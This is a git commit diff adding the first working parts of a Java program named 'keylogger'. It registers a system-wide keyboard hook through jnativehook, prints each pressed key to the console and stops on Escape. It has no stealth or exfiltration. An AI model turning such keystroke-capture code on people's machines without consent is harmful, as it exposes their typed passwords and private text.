9a725322cf7ecd5160edd20762ca172eb488389c
David M <david.macias.0101@gmail.com>
2022-08-15 20:39:22 -0700

    Added key listener

---
+++ src/main/java/com/keylogger/GlobalKeyListener.java
@@ -0,0 +1,30 @@
+package com.keylogger;
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+import org.jnativehook.keyboard.NativeKeyEvent;
+import org.jnativehook.keyboard.NativeKeyListener;
+
+public class GlobalKeyListener implements NativeKeyListener{
+    @Override
+    public void nativeKeyPressed(NativeKeyEvent e) {
+        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(e.getKeyCode()));
+        // Exits the program
+        if (e.getKeyCode() == NativeKeyEvent.VC_ESCAPE) {
+            try {
+                GlobalScreen.unregisterNativeHook();
+            } catch (NativeHookException nativeHookException) {
+                nativeHookException.printStackTrace();
+            }
+        }
+    }
+    @Override
+    public void nativeKeyTyped(NativeKeyEvent nativeKeyEvent) {
+
+    }
+
+    @Override
+    public void nativeKeyReleased(NativeKeyEvent nativeKeyEvent) {
+
+    }
+}
--- src/main/java/com/keylogger/KeyLogger.java
+++ src/main/java/com/keylogger/KeyLogger.java
@@ -1,7 +1,28 @@
 package com.keylogger;
 
+
+import org.jnativehook.GlobalScreen;
+import org.jnativehook.NativeHookException;
+
+import java.util.logging.Level;
+import java.util.logging.Logger;
+
 public class KeyLogger {
     public static void main(String[] args) {
-        System.out.println("Ok");
+        // -- Use to stop the auto logger bug from jnativehook --
+        Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());
+        logger.setLevel(Level.WARNING);
+        logger.setUseParentHandlers(false);
+        //
+        try{
+            GlobalScreen.registerNativeHook();
+        }
+        catch (NativeHookException ex){
+            System.err.println("There was a problem registering the native hook.");
+            System.err.println(ex.getMessage());
+
+            System.exit(1);
+        }
+        GlobalScreen.addNativeKeyListener(new GlobalKeyListener());
     }
 }
